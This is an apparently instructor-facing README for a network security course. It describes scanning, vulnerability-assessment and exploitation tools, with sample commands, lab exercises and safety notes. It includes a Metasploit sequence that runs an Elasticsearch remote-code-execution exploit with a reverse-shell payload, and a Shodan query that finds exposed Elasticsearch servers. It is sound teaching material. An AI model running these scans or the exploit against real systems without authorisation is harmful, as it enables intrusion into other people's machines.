# README — Network Recon & Vulnerability Toolset (Open-Source + Edu Focus)

> A comprehensive instructor-facing README describing popular open-source network scanning, banner-grabbing, web scanning, vulnerability scanning, and exploitation tools. Includes sample usage, safe-lab notes, and a comparison table you can drop into slides or share with students.

---

## ⚠️ Safety & Ethics (Put this at top of any lab)

* **Only scan systems you own or have explicit written permission to test.** Unauthorized scanning or exploitation may be illegal and may violate university policy.
* Use isolated lab VMs / containers or a university sandbox for hands-on demos (never Internet-wide scans from a campus network without approval).
* Always run offensive tools in a controlled environment and document consent for the systems you test.

---

# Contents

1. Overview (short)
2. Tools (detailed): Nmap, Masscan, ZMap, Nikto, OpenVAS/GVM, Nessus (note), Metasploit, Shodan
3. Sample lab exercises & expected outputs
4. Installation hints (apt / docker)
5. Comparison table
6. Teaching tips & wrap up

---

# 1) Overview — quick picture

* **Nmap** — port discovery, service detection, banner grabbing, scripting (NSE). Good general-purpose scanner.
* **Masscan / ZMap** — very fast port scanners for Internet-scale scanning (not detailed service detection).
* **Nikto** — focused web application scanner (common files, headers, outdated software).
* **OpenVAS (Greenbone Vulnerability Manager / GVM)** — full vulnerability scanner that uses CVE plugins to flag vulnerabilities.
* **Nessus** — commercial / freemium vulnerability scanner (mention only; not fully open-source).
* **Metasploit** — exploitation framework (post-discovery exploitation & test exploits) — use in lab only.
* **Shodan** — search engine for Internet-connected devices (useful to demonstrate global exposure; web service / API).

---

# 2) Tools — details & sample commands

---

## ## Nmap — Network Mapper

**Purpose:** Port scanning, service detection, basic vulnerability scripts (NSE).
**Install:** `sudo apt update && sudo apt install -y nmap`

**Common commands**

```bash
# Fast port scan (top 1000 ports) with service detection
nmap -sS -sV -O target.example.com

# Aggressive scan (includes OS detection, version, scripts)
nmap -A target.example.com

# Service/version detection only
nmap -sV target.example.com

# Run NSE scripts (e.g., http-enum, ssl-cert)
nmap --script=http-enum,ssl-cert -p 80,443 target.example.com

# Save output (normal, XML)
nmap -sV -oN results.txt -oX results.xml target.example.com
```

**Notes for students**

* `-sS` TCP SYN scan (stealthy).
* `-sV` probes services to identify version.
* If Nmap shows “unknown” service, read banner response (it prints fingerprint dump) to interpret manually.

**Example (expected snippet)**

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu (protocol 2.0)
8443/tcp open  https   (HTTP/1.1 404 Not Found)  # banner shows web UI
9200/tcp open  http    (WWW-Authenticate: Basic realm="Open Distro Security")
```

---

## ## Masscan — Internet-scale port scanner

**Purpose:** Extremely fast port discovery (can scan the whole IPv4 address space).
**Install:** build from source or `apt` (but apt package may be outdated). Using Docker is common.

**Sample usage**

```bash
# Scan a single host quickly for ports 1-1000
masscan -p1-1000 10.0.0.5 --rate=1000

# Scan many targets (CIDR) for port 9200
masscan 192.0.2.0/24 -p9200 --rate=10000 -oL masscan_output.txt
```

**Notes**

* Masscan reports *open ports* quickly but does not do banner grabbing/service versioning like Nmap.
* Always limit rate and scope in a lab to avoid network disruption.

---

## ## ZMap — Research/Internet-scale scanner

**Purpose:** Another Internet-scale scanner with protocol modules (research use).
**Install:** Build from source; use with care. Typical usage requires root and network tuning.

**Sample usage**

```bash
# Quick single-port scan (requires config and careful rate-limits)
zmap -p 443 198.51.100.0/24 -o zmap_output.csv
```

---

## ## Nikto — Web Application Scanner

**Purpose:** Scan web servers for common misconfigurations, outdated software, and common files.
**Install:** `sudo apt install -y nikto` or use via Docker.

**Sample usage**

```bash
# Basic scan
nikto -h http://10.0.0.20:8443

# Scan specific port with SSL
nikto -h https://10.0.0.20:8443 -ssl
```

**Expected output (snippet)**

```text
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3233: /admin/: Admin interface found.
```

**Notes**

* Good follow-up after discovering web service with Nmap (useful on port 8443).
* Will generate many findings — interpret severity carefully.

---

## ## OpenVAS / GVM (Greenbone Vulnerability Manager)

**Purpose:** Comprehensive vulnerability scanner using a large set of vulnerability tests (CVE-based).
**Install:** Complex; often run in Docker or pre-built VM image (Greenbone). Greenbone’s stack is called GVM (scanner + manager + web UI).

**Basic workflow**

1. Install GVM or use Docker image.
2. Update feed (NVTs).
3. Create a target and run a scan through the web UI or gvm-cli.
4. Review report (CVEs, severity, remediation tips).

**Command (example via `gvm-cli` / web UI)**

```text
# Most interaction is via the Greenbone web UI — create target -> run scan -> view report
```

**Notes**

* Good for labs: show CVE findings and remediation guidance.
* Requires significant resources and initial feed update time.

---

## ## Nessus (note)

**Purpose:** Commercial tool with free “Essentials” tier for training. Similar to OpenVAS but polished UI and plugin ecosystem. Not fully open-source — mention as commercial alternative.

---

## ## Metasploit Framework

**Purpose:** Penetration testing framework (post-discovery exploits, payloads, sessions). Use for controlled exploitation in labs only.
**Install:** `sudo apt install -y metasploit-framework` (or use Rapid7 Docker images).

**Sample quick flow**

```bash
# Start msfconsole
msfconsole

# Search for an exploit (example: elasticsearch)
search elasticsearch

# Use exploit (lab-only), set RHOST and payload, then run
use exploit/linux/http/elasticsearch_scripting_rce
set RHOST 10.0.0.30
set RPORT 9200
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.0.0.5
exploit
```

**Notes**

* Metasploit can be destructive — ensure explicit permission and lab isolation.
* Use simulated exploits on intentionally vulnerable images (Metasploitable, OWASP Broken Web Apps).

---

## ## Shodan (search engine)

**Purpose:** Search for devices/servers on the public Internet by banner, port, or metadata. Good for showing real-world exposure.
**Usage (web):** Search `port:9200 "Open Distro Security"` to see exposed Elasticsearch instances.
**API sample (python)**

```python
from shodan import Shodan
api = Shodan("YOUR_API_KEY")
results = api.search('port:9200 "Open Distro Security"')
for r in results['matches'][:5]:
    print(r['ip_str'], r['port'], r['data'][:200])
```

**Notes**

* Do not use Shodan to target systems — use for research and classroom demonstration of exposure.

---

# 3) Sample classroom exercises (step-by-step + talking points)

## Exercise A — From discovery to identification (single lab VM)

1. **Goal:** Discover open ports and identify services.
2. **Commands**

   * `nmap -sS -sV -O -p- 10.0.0.50`  (full TCP port scan + service detection + OS guess)
   * Interpret Nmap output; if a port is unknown, review banners with `nmap -sV --script=banner -p 8443 10.0.0.50`
3. **Follow up**

   * If `port 8443` is web UI → `nikto -h https://10.0.0.50:8443 -ssl`
   * If `port 9200` → curl the API carefully:

     ```bash
     curl -sS -I http://10.0.0.50:9200/
     # or (if protected) show WWW-Authenticate header
     curl -v http://10.0.0.50:9200/ 2>&1 | sed -n '1,40p'
     ```
4. **Talking points**

   * Banner grabbing vs. fingerprint matching.
   * False positives and interpretation.
   * Responsible disclosure and remediation steps.

---

## Exercise B — Vulnerability scan (lab only)

1. Use **OpenVAS / GVM** to run a scan of the lab VM.
2. Show how results map to services discovered by Nmap (e.g., CVE affecting Elasticsearch).
3. Discuss patching / configuration changes.

---

## 4) Installation hints (apt / docker / permission)

* **Nmap / Nikto / Masscan** — easy with `apt` on Ubuntu:
  `sudo apt update && sudo apt install -y nmap nikto masscan`
* **ZMap** — often built from source. Use Docker if available.
* **OpenVAS / GVM** — use Docker images (Greenbone community), or VM appliances (resource intensive).
* **Metasploit** — `sudo apt install metasploit-framework` or use Kali/Metasploitable images for safety.
* **Run as non-root when possible** except where raw packet capture is required (Nmap SYN scan, Masscan). Use `sudo` with caution.

---

# 5) Comparison table

| Tool                    |                                     Primary Purpose | Strengths                                               | Weaknesses                                   | Typical Classroom Use                               | License / Notes                  |
| ----------------------- | --------------------------------------------------: | ------------------------------------------------------- | -------------------------------------------- | --------------------------------------------------- | -------------------------------- |
| **Nmap**                | Port/service discovery, OS detection, NSE scripting | Versatile, rich scripting (NSE), good service detection | Slower for huge IP ranges                    | Primary scanner in labs; teach banner reading & NSE | GPL-like (open source)           |
| **Masscan**             |                           Ultra-fast port discovery | Very fast (Internet-scale)                              | Minimal service identification; noisy        | Demonstrate scale & rate control; quick discovery   | Open-source                      |
| **ZMap**                |                             Internet-scale scanning | Scalable research tool                                  | Complex setup; requires network tuning       | Research demos / wide scans (with approval)         | Open-source                      |
| **Nikto**               |                  Web vulnerability & misconfig scan | Easy to use for web issues                              | Generates many false positives; basic checks | Follow-up to web-service discovery                  | Open-source (GPL)                |
| **OpenVAS / GVM**       |            Full vulnerability scanning (CVE checks) | Comprehensive CVE checks, reports                       | Resource-heavy; setup complexity             | Teach vulnerability assessment & remediation        | Open-source (Greenbone)          |
| **Nessus (Essentials)** |                 Vulnerability scanning (commercial) | Polished UI, many plugins                               | Not fully open-source; limited free tier     | Alternative to OpenVAS for demos                    | Freemium (commercial)            |
| **Metasploit**          |                         Exploitation & post-exploit | Huge exploit library, payloads                          | Dangerous if misused                         | Controlled exploit demos in lab only                | Open-source + commercial plugins |
| **Shodan**              |                      Internet device/service search | Real-world exposure visibility                          | Not a scanner; search only                   | Show internet-exposed services & risk               | Freemium API / web service       |

---

# 6) Teaching tips & slide snippets

* **Slide idea:** “Discovery → Identification → Vulnerability → Remediation” with tools mapped to each stage:

  * Discovery: `Masscan`, `ZMap`, `Nmap`
  * Identification: `Nmap -sV`, `banner grab`, `Nikto`
  * Vulnerability: `OpenVAS / Nessus`
  * Exploit (lab only): `Metasploit`
* **Live demo sequence** (safe):

  1. Run `nmap -sS -sV` on an internal, isolated VM.
  2. Show `curl -I` to read banners.
  3. Run `nikto` against the VM’s web UI.
  4. Run OpenVAS in a separate step (or show pre-generated reports).
* **Assessment idea:** Give students a VM image with known open ports (8443, 9200, 22, 8080) and ask them to produce a short report: discovered ports, identified services, at least one vulnerability and recommended mitigation.

---

# Appendix: Quick reference commands

```bash
# Nmap (service detection)
nmap -sS -sV -O -p 22,80,443,8443,9200 10.0.0.50

# Masscan (fast port just discovery)
masscan -p1-65535 10.0.0.0/24 --rate=1000 -oL masscan.txt

# Nikto (web scan)
nikto -h https://10.0.0.50:8443 -ssl

# Curl to read banner
curl -v http://10.0.0.50:9200/ 2>&1 | sed -n '1,50p'

# Start Metasploit console (lab only)
msfconsole
```

---
